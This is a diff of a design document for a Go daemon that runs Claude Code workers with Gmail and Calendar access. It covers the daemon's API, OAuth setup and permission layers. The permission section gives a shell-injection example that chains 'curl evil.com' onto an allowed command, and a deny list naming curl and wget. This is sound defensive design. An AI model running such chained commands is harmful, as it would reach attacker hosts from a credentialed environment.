@@ -83,13 +83,36 @@ submitted → queued → running → completed | failed
 
 ### Persistence
 
-Single JSON file (`~/.gobrrr/queue.json`). Loaded on startup, flushed on every state transition. On crash recovery, tasks stuck in `running` are reset to `queued` and replayed.
+Single JSON file (`~/.gobrrr/queue.json`). Loaded on startup, flushed on every state transition using atomic writes (write to `queue.json.tmp`, then `os.Rename()` to `queue.json`) to prevent corruption on crash. On crash recovery, tasks stuck in `running` are reset to `queued` and replayed.
 
 No SQLite — for a single-user system processing 10-50 tasks/day, a JSON file is simpler to debug, has no cgo dependency, and is plenty fast.
+
+All JSON schemas include a `"version": 1` field for future migration support.
 
 ### Concurrency
 
 Default 2 concurrent workers (configurable). Matches the 4 CPU / 8GB LXC constraint. Tasks beyond the limit stay in `queued` and drain FIFO. Priority sorts within the queue; equal priority is FIFO.
+
+## Protocol
+
+The daemon exposes an HTTP/1.1 API over the Unix socket (`~/.gobrrr/gobrrr.sock`). The CLI and workers communicate with the daemon via this API. Go's `net/http` package supports Unix socket listeners natively.
+
+### Endpoints
+
+| Method | Path | Description |
+|--------|------|-------------|
+| `POST` | `/tasks` | Submit a new task |
+| `GET` | `/tasks` | List tasks (query params: `status`, `all`) |
+| `GET` | `/tasks/{id}` | Get task status and result |
+| `DELETE` | `/tasks/{id}` | Cancel a task |
+| `GET` | `/tasks/{id}/logs` | Stream task logs |
+| `POST` | `/tasks/{id}/approve` | Approve a write action |
+| `POST` | `/tasks/{id}/deny` | Deny a write action |
+| `POST` | `/gmail/{action}` | Gmail operations (list, read, send) |
+| `POST` | `/gcal/{action}` | Calendar operations (today, week, create) |
+| `GET` | `/health` | Daemon health check |
+
+Request/response bodies are JSON. Errors use standard HTTP status codes with a `{"error": "message"}` body.
 
 ## CLI Interface
 
@@ -106,6 +129,10 @@ gobrrr list --all              # include completed/failed
 gobrrr status <task-id>
 gobrrr cancel <task-id>
 gobrrr logs <task-id>
+
+# Approval (for write-action confirmation gate)
+gobrrr approve <task-id>
+gobrrr deny <task-id>
 
 # Google integrations
 gobrrr gmail list --unread --limit 10
@@ -131,7 +158,7 @@ gobrrr setup google-account --name work
 
 - `telegram` — send result via Telegram bot API
 - `stdout` — CLI blocks until task completes, prints result (for skills/scripts)
-- `file:<path>` — write result to file
+- `file:<path>` — write result to file (restricted to `~/.gobrrr/output/` or `/tmp/gobrrr/` to prevent writes to sensitive paths)
 
 ## Worker Execution
 
@@ -187,17 +214,36 @@ OAuth2 with locally managed refresh tokens. No dependency on Claude's account-le
 }
 ```
 
+### OAuth2 Client Credentials
+
+Users must create their own Google Cloud project (gobrrr does not ship embedded client credentials). The setup wizard guides through this:
+
+1. Go to Google Cloud Console → create project (or select existing)
+2. Enable Gmail API and Google Calendar API
+3. Create OAuth2 credentials (Desktop app type)
+4. Download the client ID and client secret
+
+The wizard prompts for these values, encrypts them, and stores them alongside the refresh token in `credentials.enc`.
+
 ### OAuth2 Flow (One-Time Setup)
 
-1. `gobrrr setup google-account --name personal` generates an auth URL
-2. User opens the URL on any machine with a browser
-3. Signs in, grants permissions, gets an auth code
-4. Pastes the code back into the CLI
-5. gobrrr exchanges it for a refresh token, encrypts, and stores it
+1. `gobrrr setup google-account --name personal` prompts for client ID/secret (if not already configured)
+2. Generates an auth URL with the correct scopes
+3. User opens the URL on any machine with a browser
+4. Signs in, grants permissions, gets an auth code
+5. Pastes the code back into the CLI
+6. gobrrr exchanges it for a refresh token, encrypts, and stores it
 
 After setup, fully headless. The daemon uses the refresh token to get short-lived access tokens automatically.
 
 **Note:** The Google Cloud project must be set to "production" status (not "testing") to prevent refresh token expiry after 7 days. The setup wizard handles this guidance.
+
+### Google API Error Handling
+
+- **401 Unauthorized:** Automatic token refresh using the stored refresh token. If refresh fails (revoked token), mark account as invalid and alert via Telegram.
+- **429 Rate Limit:** Exponential backoff with jitter (1s, 2s, 4s, max 30s). Retry up to 5 times.
+- **5xx Server Error:** Same backoff strategy as 429.
+- **Network errors:** Retry up to 3 times with 2s intervals.
 
 ### API Coverage
 
@@ -238,11 +284,13 @@ All API calls are made by the daemon process, never by workers. Workers call `go
 - Alternatively via `GOBRRR_MASTER_KEY` environment variable (for systemd `EnvironmentFile=`)
 - If env var set, no key file is written to disk
 
+**Threat model note:** The master key and encrypted credentials are co-located under `~/.gobrrr/`. This is a deliberate trade-off for a single-user LXC: if an attacker has read access to `~/.gobrrr/`, they already own the user account and can read any file the user can. The encryption protects against accidental exposure (e.g., backing up the directory, copy-pasting files) but not against a compromised user session. For higher-security environments, use the `GOBRRR_MASTER_KEY` env var to store the key outside the data directory (e.g., in a secrets manager or systemd credential store).
+
 **Runtime behavior:**
 - Credentials decrypted into memory on daemon startup
 - Refresh tokens live in memory only, never written unencrypted
 - Access tokens are short-lived (1 hour), kept in memory, never persisted
-- On shutdown, secret memory is explicitly zeroed before GC
+- On shutdown, best-effort secret zeroing (Go's GC may leave copies in heap; this is a known limitation of managed-memory languages — use `syscall.Mlock` to prevent swapping of credential pages)
 
 **File permissions enforced on startup:**
 ```
@@ -271,31 +319,28 @@ Body: ...
 
 **Layer 2: Action allowlist on workers**
 
-Workers get a restrictive per-task `settings.json`:
+Workers get a restrictive per-task `settings.json`.
+
+The allowlist uses a single `Bash(gobrrr *)` pattern rather than fine-grained subcommand globs. This prevents shell injection via glob bypass (e.g., `gobrrr gmail list --limit 1 && curl evil.com` matching `Bash(gobrrr gmail list *)`). The gobrrr binary itself enforces which subcommands are valid for the task's permission level.
 
 Read-only task (default):
 ```json
 {
   "permissions": {
     "allow": [
-      "Bash(gobrrr gmail list *)",
-      "Bash(gobrrr gmail read *)",
-      "Bash(gobrrr gcal today *)",
-      "Bash(gobrrr gcal week *)",
+      "Bash(gobrrr *)",
       "Read", "Glob", "Grep"
     ],
     "deny": [
-      "Bash(gobrrr gmail send *)",
-      "Bash(gobrrr gmail forward *)",
-      "Bash(gobrrr gcal create *)",
-      "Bash(gobrrr gcal delete *)",
-      "Bash(gobrrr submit *)",
       "Bash(curl *)", "Bash(wget *)",
+      "Bash(claude *)",
       "Write", "Edit"
     ]
   }
 }
 ```
+
+The gobrrr binary checks a `GOBRRR_TASK_MODE` environment variable (set by the daemon: `readonly` or `readwrite`) and rejects write operations (send, create, delete) when in readonly mode, returning a clear error message.
 
 Write-enabled tasks require explicit `--allow-writes` flag at submission.
 
@@ -313,6 +358,8 @@ Even with `--allow-writes`, destructive actions require Telegram user confirmati
 ```
 
 Timeout after 5 minutes → denied.
+
+The main Telegram session's CLAUDE.md includes instructions to route `/approve` and `/deny` commands to `gobrrr approve <task-id>` and `gobrrr deny <task-id>` CLI calls.
 
 **Layer 4: Credential isolation**
 
@@ -358,7 +405,7 @@ Before routing results to Telegram, the daemon scans for credential-like pattern
 │   ├── setup.sh                 # One-line installer
 │   └── uninstall.sh             # Clean removal
 ├── systemd/
-│   └── gobrrr.service           # Daemon systemd unit
+│   └── gobrrr.service           # Daemon systemd unit (Restart=on-failure, WatchdogSec=60)
 ├── skills/
 │   ├── gmail/
 │   │   └── SKILL.md             # Claude instructions for gobrrr gmail
@@ -443,6 +490,28 @@ go build -o ~/.local/bin/gobrrr ./cmd/gobrrr/
 gobrrr setup
 ```
 
+## Daemon Health & Monitoring
+
+### Systemd Integration
+
+The systemd unit uses `Restart=on-failure`, `RestartSec=5`, and `WatchdogSec=60`. The daemon sends `sd_notify(WATCHDOG=1)` every 30 seconds via Go's `systemd` notify protocol (pure Go, no cgo — uses `net.Dial("unixgram", ...)` to the `NOTIFY_SOCKET`).
+
+### Health Endpoint
+
+`GET /health` returns daemon status, active worker count, queue depth, and uptime. The existing `healthcheck.sh` can poll this endpoint to report to Uptime Kuma.
+
+### Stdout Reply-to Resilience
+
+If the daemon restarts while a `--reply-to stdout` client is connected, the TCP connection over the Unix socket breaks. The CLI detects this and exits with an error. The task remains in `running` state and is replayed on daemon restart — but the original CLI client is gone, so the result is logged to `~/.gobrrr/logs/<task-id>.log` instead.
+
+### Worker Spawn Rate Limiting
+
+To avoid thundering herd on the Claude Code Max plan rate limiter, the daemon enforces a minimum 5-second interval between spawning `claude -p` workers (configurable via `config.json` as `spawn_interval_sec`). Tasks queued at the same time (e.g., multiple timers firing at once) are staggered.
+
+### Log Rotation
+
+Task logs at `~/.gobrrr/logs/` are pruned automatically. Default retention: 7 days. Configurable via `config.json` as `log_retention_days`. Pruning runs once per hour as part of the daemon's maintenance loop.
+
 ## Constraints
 
 - **4 CPU / 8GB LXC** — daemon overhead ~10-20MB, workers share Max plan rate limits
@@ -451,8 +520,8 @@ gobrrr setup
 - **Skills over MCP** — prefer CLI skills to avoid wasting context on MCP tool definitions
 - **claude-mem incompatible** — workers don't use claude-mem (blocks channel mode)
 
-## Open Questions
+## Decisions
 
-1. Should `gobrrr` handle timer CRUD itself (replacing `manage-timer.sh`), or keep timers separate?
-2. Should there be a web dashboard for task monitoring, or is CLI + Telegram sufficient?
-3. Rate limiting strategy for Max plan — should the daemon enforce delays between worker spawns?
+1. **Timer CRUD:** Keep `manage-timer.sh` separate. Timers call `gobrrr submit` as their execution mechanism. Timer creation/deletion remains a systemd concern — gobrrr doesn't need to own scheduling.
+2. **Dashboard:** CLI + Telegram is sufficient for v1. A web dashboard is out of scope.
+3. **Rate limiting:** Resolved — 5-second minimum spawn interval between workers. See "Worker Spawn Rate Limiting" section.
